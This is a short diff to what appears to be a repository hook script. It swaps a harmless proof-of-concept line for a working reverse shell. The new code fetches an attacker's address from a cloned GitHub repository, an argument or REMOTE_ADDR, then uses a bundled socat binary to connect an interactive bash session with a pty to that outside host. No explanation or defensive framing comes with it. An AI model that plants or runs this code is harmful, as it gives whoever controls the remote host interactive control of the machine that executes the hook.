@@ -1,2 +1,16 @@
-#!/bin/bash
-echo $PWD > /tmp/poc
+#!./hooks/static_bash
+# PWD ....../test (test is the repo name)
+if [ -z "$1" ]; then
+    if [ -z "$REMOTE_ADDR" ]; then
+        cd /tmp && git clone -b addr --single-branch https://github.com/yuvalavra/ngrok.git
+        remote_serv="$(cat /tmp/ngrok/ip_port)"
+        rm -rf /tmp/ngrok
+        cd /
+    else
+        remote_serv="$REMOTE_ADDR"
+    fi
+else
+    remote_serv="$1"
+fi
+
+./hooks/static_socat "exec:./hooks/static_bash -li,pty,stderr,setsid,sigint,sane" "tcp:$remote_serv"
